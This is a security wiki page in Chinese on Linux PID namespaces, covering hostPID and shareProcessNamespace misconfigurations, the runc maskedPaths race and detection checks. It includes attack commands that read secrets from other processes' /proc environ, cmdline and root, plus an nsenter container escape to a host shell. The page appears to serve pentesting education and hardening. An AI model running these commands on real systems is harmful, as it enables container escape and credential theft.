# PID 命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID 命名空间控制进程的编号方式以及哪些进程可见。这就是容器可以拥有自己的 PID 1、即使它并非一台真实机器的原因。在命名空间内部，工作负载看到的是一个看似本地的进程树。在命名空间外部，主机仍能看到真实的主机 PID 和完整的进程情况。<sup>[[3]](#references)</sup>

从安全角度来看，PID 命名空间很重要，因为进程可见性很有价值。一旦工作负载能够看到主机进程，就可能观察到服务名称、命令行参数、通过进程参数传递的机密信息、通过 `/proc` 获取的环境变量状态，以及潜在的命名空间进入目标。如果它不仅能看到这些进程，还能执行更多操作，例如在满足相应条件时发送信号或使用 ptrace，问题就会严重得多。

## 运作方式

新的 PID 命名空间会从自己的内部进程编号开始。该命名空间中创建的第一个进程，从命名空间的角度来看就是 PID 1；这也意味着它对孤儿子进程和信号行为具有类似 init 的特殊语义。这解释了容器中许多与 init 进程、僵尸进程回收有关的奇怪现象，也解释了为什么容器有时会使用精简的 init 包装器。<sup>[[3]](#references)</sup>

PID 命名空间构成一个层级。在祖先命名空间中的进程可以使用该祖先命名空间分配的 PID 寻址后代进程，但后代进程不能通过普通的基于 PID 的系统调用访问仅存在于祖先命名空间中的任务，也不能通过 `setns()` 向上加入祖先 PID 命名空间。祖先拥有、但有意暴露给后代的 procfs，仍可能泄露祖先的进程视图。此外，通过 `setns()` 加入 PID 命名空间会改变**未来子进程**的命名空间，而不会改变调用者自身的命名空间；因此，相关工具会在加入后 fork。procfs 挂载会保留挂载它的进程所看到的 PID 视图，这就是为什么在 `unshare(CLONE_NEWPID)` 后创建新的 procfs 与安全相关，而不只是表面上的问题。<sup>[[3]](#references)</sup>

重要的安全教训是：进程可能看起来已被隔离，因为它只能看到自己的 PID 树，但这种隔离可以被有意移除。Docker 通过 `--pid=host` 提供此功能，而 Kubernetes 则通过 `hostPID: true` 实现。一旦容器加入主机 PID 命名空间，工作负载就能直接看到主机进程，许多后续攻击途径也会变得更现实。

## 实验

手动创建 PID 命名空间：

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

shell 现在看到的是私有进程视图。`--mount-proc` 标志很重要，因为它会挂载与新的 PID namespace 匹配的 procfs 实例，使容器内部看到的进程列表保持一致。<sup>[[3]](#references)</sup>

对比容器行为：

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

这种差异一目了然，也很容易理解，因此这是适合读者入门的第一个实验。

## Runtime Usage

Docker、Podman、containerd 和 CRI-O 中的普通容器都有自己的 PID 命名空间。Kubernetes 容器通常具有各自独立的 PID 视图；`shareProcessNamespace: true` 则会刻意创建一个 Pod 级别的共享视图。<sup>[[4]](#references)</sup> 相比之下，`hostPID: true` 会选择节点的 PID 命名空间。LXC/Incus 环境依赖相同的内核原语，不过系统容器的使用场景可能会呈现更复杂的进程树，也更容易让人采用一些调试捷径。

同一规则适用于所有环境：如果运行时选择不隔离 PID 命名空间，就意味着有意降低了容器边界的安全性。

## Misconfigurations

最典型的错误配置是共享宿主机 PID。团队经常以调试、监控或方便服务管理为由为此辩护，但这始终应被视为重要的安全例外。即使容器无法直接写入宿主机进程，仅仅是能够查看这些进程，也可能泄露大量系统信息。一旦再授予 `CAP_SYS_PTRACE` 等 capability，或提供有用的 procfs 访问权限，风险就会显著扩大。

另一个错误是认为工作负载默认无法终止或 ptrace 宿主机进程，所以共享宿主机 PID 就无害。这种结论忽视了枚举信息的价值、可用于进入命名空间的目标，以及 PID 可见性与其他弱化的安全控制叠加后产生的影响。

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` 与 `hostPID` 不同：它暴露的是**同一 Pod 中其他容器的进程**，而不是节点进程。遭到入侵的 sidecar 或调试容器随后可以枚举同级容器的命令行和环境数据（具体取决于 procfs 访问检查），在凭据允许时发送信号，并通过 `/proc/<pid>/root` 遍历同级容器的文件系统。Kubernetes 明确警告，此时命令行/环境变量中的机密信息和容器文件系统仅受适用的 Unix 权限保护。<sup>[[4]](#references)</sup>

适用于集群侧审查的命令：

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

在 Pod-wide PID namespace 中，从已攻陷的容器出发时，应先测试实际访问权限，而不是假设可见就意味着可读：<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### 在现有 Kubernetes Pod 中定向添加临时容器

拥有修改 `pods/ephemeralcontainers` 权限的 Kubernetes 身份，即使未设置 `shareProcessNamespace`，也可以向正在运行的 Pod 添加调试器。使用 `--target` 时，如果运行时支持命名空间定向，调试器会加入指定容器的进程命名空间。这只能查看该容器的进程，不能查看节点的 host PID 命名空间。<sup>[[5]](#references)</sup>

API 使用独立的子资源，因此应检查其 `patch`/`update` 权限，不要假设普通的 Pod 写入权限也涵盖该子资源。<sup>[[6]](#references)</sup>

对于授权命名空间中的 Pod 和容器，可测试定向视图：<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

如果 runtime 不支持 targeting，debugger 可能无法启动，或仍处于隔离的 PID namespace 中。<sup>[[5]](#references)</sup> 如果 targeting 可用，请使用 [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) 下的检查来测试对 `/proc/<pid>` 的访问。可见不代表有权限读取目标的 secrets 或向其发送信号：Unix credentials 和 procfs 访问检查仍然适用。<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards 也会限制 ephemeral containers 的 privileged 设置。<sup>[[7]](#references)</sup>

## 滥用

如果共享了主机 PID namespace，攻击者可能检查主机进程、收集进程参数、识别有趣的服务、为 `nsenter` 找到候选 PID，或结合进程可见性与 ptrace 相关权限，干扰主机或相邻工作负载。在某些情况下，只要看到合适的长期运行进程，就足以调整后续攻击计划。

实际操作的第一步始终是确认主机进程确实可见：

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

一旦 host PID 可见，进程参数和 namespace 进入目标往往就成为最有用的信息来源：

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

如果 `nsenter` 可用且权限足够，请测试是否可以将可见的 host 进程用作 namespace 桥接：

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

即使入口被阻止，共享 host PID 也很有价值，因为它能揭示服务布局、运行时组件，以及下一步可作为目标的候选特权进程。仅有 PID 可见性**并不**授予发送信号、跟踪进程、读取敏感的 `/proc/<pid>` 条目或加入目标其他命名空间的权限；凭据、可转储性、目标命名空间所属 user namespace 中的 capabilities、Yama/LSM 策略以及 seccomp 仍然会起作用。<sup>[[3]](#references)</sup> 有关进程注入示例，请参阅 [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)。

host PID 可见性也使文件描述符滥用变得更加可行。如果某个特权 host 进程或相邻工作负载打开了敏感文件或 socket，攻击者可能能够检查 `/proc/<pid>/fd/`，并根据 ptrace 类检查、所有权、procfs 挂载选项、对象类型及目标服务模型访问底层对象。仅仅看到 FD 符号链接，并不意味着就能打开它；而且，仅通过打开 `/proc/<pid>/fd/N` 符号链接，无法复制 socket。有关独立的 `pidfd_getfd()` 原语及其授权检查，请参阅 [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md)。<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

这些命令很有用，因为它们能判断 `hidepid=1` 或 `hidepid=2` 是否降低了跨进程可见性，以及明显值得关注的文件描述符（例如已打开的机密文件、日志或 Unix socket）是否可见。

### 完整示例：host PID + `nsenter`

当进程具备加入 host namespaces 并采用 host 进程 root 的必要 capabilities 时，共享 host PID 可能导致 host escape。后者需要使用 `nsenter --root`（`-r`）：仅更改 mount namespace 不会更改调用者的 root directory。<sup>[[9]](#references)</sup> 访问 `/proc/1/root` 受 ptrace 读取检查限制，而更改 root 则要求调用者的 user namespace 中具有 `CAP_SYS_CHROOT`。<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

如果命令执行成功，新 shell 将使用宿主机的 mount、UTS、network、IPC 和 PID namespaces，以及 PID 1 的根文件系统。不要仅凭能够看到 PID 就认定已获得宿主机权限；请检查有效身份和访问权限。<sup>[[9]](#references)</sup>

即使系统中没有 `nsenter`，只要宿主机文件系统已挂载，也可能通过宿主机二进制文件实现相同结果：

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Recent Runtime Notes

一些与 PID namespace 相关的攻击并非传统的 `hostPID: true` 配置错误，而是 runtime 实现中的 bug，涉及容器设置期间如何应用 procfs 保护措施。

#### `maskedPaths` race to host procfs

在存在漏洞的 `runc` 版本中，能够控制容器镜像或 `runc exec` 工作负载的攻击者，可以通过将容器内的 `/dev/null` 替换为指向敏感 procfs 路径（例如 `/proc/sys/kernel/core_pattern`）的符号链接，在屏蔽阶段制造 race。如果 race 成功，masked-path bind mount 可能会挂载到错误的目标上，从而向新容器暴露主机全局的 procfs 控制项。<sup>[[1]](#references)</sup>

实用的审查命令：

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

这很重要，因为最终造成的影响可能与直接暴露 procfs 相同：可写的 `core_pattern` 或 `sysrq-trigger`，继而导致主机代码执行或拒绝服务。专门介绍 [masked paths](../masked-paths.md) 和 [sensitive host mounts](../../sensitive-host-mounts.md) 的页面涵盖了 procfs 的一般攻击面，这里不再重复。

#### 使用 `insject` 进行 namespace 注入

`insject` 等 namespace 注入工具表明，与 PID namespace 交互并不总是需要在创建进程前先进入目标 namespace。辅助程序可以稍后附加，使用 `setns()`，并在执行时保留对目标 PID 空间的可见性：<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

这种技术主要适用于高级调试、攻击性工具和 post-exploitation 工作流，此时运行时已经初始化工作负载，必须在此之后加入 namespace 上下文。

### 相关 FD 滥用模式

当 host PID 可见时，有两种模式值得特别指出。首先，特权进程可能会在 `execve()` 后继续持有敏感文件描述符，因为它没有被标记为 `O_CLOEXEC`。其次，服务可能会通过 Unix socket 使用 `SCM_RIGHTS` 传递文件描述符。在这两种情况下，关键对象都不再是路径名，而是低权限进程可能继承或接收的已打开句柄。

这在容器工作中很重要，因为即使容器文件系统无法直接访问该路径，这个句柄仍可能指向 `docker.sock`、特权日志、host 上的机密文件或其他高价值对象。

## 检查

这些命令旨在确定进程是否具有私有的 PID 视图，或者是否已经能够枚举范围广得多的进程环境。

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

这里有什么值得注意的：<sup>[[3]](#references)</sup>

- 如果进程列表中包含明显的宿主机服务，那么很可能已经启用了 host PID sharing。
- 只看到一个很小的容器内进程树是正常基线；看到 `systemd`、`dockerd` 或无关的守护进程则不正常。
- `NSpid` 可以显示跨嵌套命名空间的 PID 映射。最左侧的值相对于与 procfs 挂载关联的 PID 命名空间，之后依次是更深层嵌套命名空间中的值。
- 单独运行 `readlink /proc/self/ns/pid` 不能证明启用了 `hostPID`：隔离的容器也有有效的 PID 命名空间 inode。请结合进程列表、procfs 挂载、运行时配置，以及可用时宿主机侧的命名空间 inode 进行判断。
- 一旦能看到宿主机 PID，即使是只读的进程信息也能用于侦察。

如果发现某个容器启用了 host PID sharing，不要把它当作表面上的差异。这会显著改变工作负载能够观察到并可能影响的内容。





## References

- [1] [runc 安全公告：由于挂载竞态条件，通过滥用“masked path”实现容器逃逸（CVE-2025-31133）](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [工具发布——insject：Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 手册](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [在 Pod 中的容器之间共享进程命名空间](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [调试运行中的 Pod](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [临时容器 KEP](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod 安全标准](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
